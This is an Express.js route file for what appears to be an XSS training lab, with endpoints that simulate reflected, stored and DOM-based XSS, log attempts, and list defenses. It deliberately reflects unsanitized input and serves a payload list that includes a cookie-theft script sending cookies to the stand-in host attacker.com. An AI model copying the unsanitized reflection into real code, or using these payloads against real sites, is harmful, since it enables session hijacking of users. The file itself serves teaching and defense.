import { Router } from "express";
import { LAB_DATA, broadcast } from "../server.js";

export const router = Router();

// XSS vulnerability simulation
router.post("/reflect", (req, res) => {
  const { input = "", sanitize = false } = req.body || {};
  
  const incident = {
    type: "xss_attempt",
    payload: input,
    sanitized: sanitize,
    ip: req.ip || "127.0.0.1",
    timestamp: new Date().toISOString()
  };
  
  LAB_DATA.incidents.push(incident);
  broadcast({ type: "xss_attempt", data: incident });
  
  let output;
  if (sanitize) {
    // Demonstrate proper sanitization
    output = input
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#x27;")
      .replace(/\//g, "&#x2F;");
  } else {
    // Vulnerable - reflects input without sanitization
    output = input;
  }
  
  console.log("🔥 [XSS-ATTEMPT]", incident);
  
  res.json({
    success: true,
    reflected_input: output,
    vulnerable: !sanitize,
    warning: sanitize ? "Input properly sanitized" : "VULNERABLE: Script injection possible"
  });
});

// Stored XSS simulation
router.post("/store", (req, res) => {
  const { comment = "", username = "anonymous" } = req.body || {};
  
  const storedXSS = {
    id: Date.now(),
    username: username,
    comment: comment,
    timestamp: new Date().toISOString(),
    dangerous: comment.includes("<script>") || comment.includes("javascript:")
  };
  
  // Store in lab data (would be database in real app)
  if (!LAB_DATA.storedComments) LAB_DATA.storedComments = [];
  LAB_DATA.storedComments.push(storedXSS);
  
  if (storedXSS.dangerous) {
    const incident = {
      type: "stored_xss",
      payload: comment,
      username: username,
      ip: req.ip || "127.0.0.1",
      timestamp: new Date().toISOString()
    };
    
    LAB_DATA.incidents.push(incident);
    broadcast({ type: "stored_xss", data: incident });
  }
  
  res.json({
    success: true,
    stored: true,
    dangerous: storedXSS.dangerous,
    message: storedXSS.dangerous ? 
      "DANGER: Malicious script stored - would execute for all users" :
      "Comment stored safely"
  });
});

// Get stored comments (demonstrates stored XSS)
router.get("/comments", (req, res) => {
  const comments = LAB_DATA.storedComments || [];
  
  res.json({
    comments: comments,
    warning: "In real application, malicious scripts would execute when viewing these comments",
    total: comments.length
  });
});

// DOM-based XSS simulation
router.post("/dom", (req, res) => {
  const { fragment = "" } = req.body || {};
  
  const domPayloads = [
    "javascript:alert('XSS')",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "');alert('XSS');//"
  ];
  
  const isDangerous = domPayloads.some(payload => 
    fragment.toLowerCase().includes(payload.toLowerCase())
  );
  
  if (isDangerous) {
    const incident = {
      type: "dom_xss",
      payload: fragment,
      ip: req.ip || "127.0.0.1",
      timestamp: new Date().toISOString()
    };
    
    LAB_DATA.incidents.push(incident);
    broadcast({ type: "dom_xss", data: incident });
  }
  
  res.json({
    success: true,
    dom_fragment: fragment,
    dangerous: isDangerous,
    message: isDangerous ? 
      "DOM XSS detected - would execute in browser context" :
      "DOM fragment appears safe"
  });
});

// XSS payload generator
router.get("/payloads", (req, res) => {
  const payloads = [
    {
      type: "Basic Alert",
      payload: "<script>alert('XSS')</script>",
      description: "Simple script injection"
    },
    {
      type: "Cookie Theft",
      payload: "<script>document.location='http://attacker.com/steal?'+document.cookie</script>",
      description: "Steals user cookies"
    },
    {
      type: "Image-based",
      payload: "<img src=x onerror=alert('XSS')>",
      description: "Uses image error event"
    },
    {
      type: "SVG-based",
      payload: "<svg onload=alert('XSS')>",
      description: "Uses SVG onload event"
    },
    {
      type: "Event Handler",
      payload: "<div onclick=alert('XSS')>Click me</div>",
      description: "Uses event handler attribute"
    },
    {
      type: "JavaScript URI",
      payload: "<a href=\"javascript:alert('XSS')\">Click</a>",
      description: "Uses javascript: protocol"
    }
  ];
  
  res.json({
    payloads: payloads,
    warning: "These are for educational purposes only - never use against real applications without permission"
  });
});

// XSS defense techniques
router.get("/defense", (req, res) => {
  const defenses = [
    {
      technique: "Input Sanitization",
      description: "Remove or encode dangerous characters",
      implementation: "Use libraries like DOMPurify or html-entities"
    },
    {
      technique: "Content Security Policy",
      description: "Browser-level script execution control",
      implementation: "Set CSP headers to restrict script sources"
    },
    {
      technique: "Output Encoding",
      description: "Encode output based on context (HTML, JS, CSS, URL)",
      implementation: "Context-aware encoding functions"
    },
    {
      technique: "HttpOnly Cookies",
      description: "Prevent JavaScript access to cookies",
      implementation: "Set HttpOnly flag on sensitive cookies"
    },
    {
      technique: "SameSite Cookies",
      description: "Prevent cross-site cookie inclusion",
      implementation: "Set SameSite=Strict or Lax"
    }
  ];
  
  res.json(defenses);
});

// XSS analytics
router.get("/analytics", (req, res) => {
  const xssIncidents = LAB_DATA.incidents.filter(i => 
    i.type === "xss_attempt" || i.type === "stored_xss" || i.type === "dom_xss"
  );
  
  const analytics = {
    totalAttempts: xssIncidents.length,
    byType: {
      reflected: xssIncidents.filter(i => i.type === "xss_attempt").length,
      stored: xssIncidents.filter(i => i.type === "stored_xss").length,
      dom: xssIncidents.filter(i => i.type === "dom_xss").length
    },
    uniquePayloads: new Set(xssIncidents.map(i => i.payload)).size,
    riskLevel: "CRITICAL",
    lastAttempt: xssIncidents[xssIncidents.length - 1]?.timestamp || null
  };
  
  res.json(analytics);
});
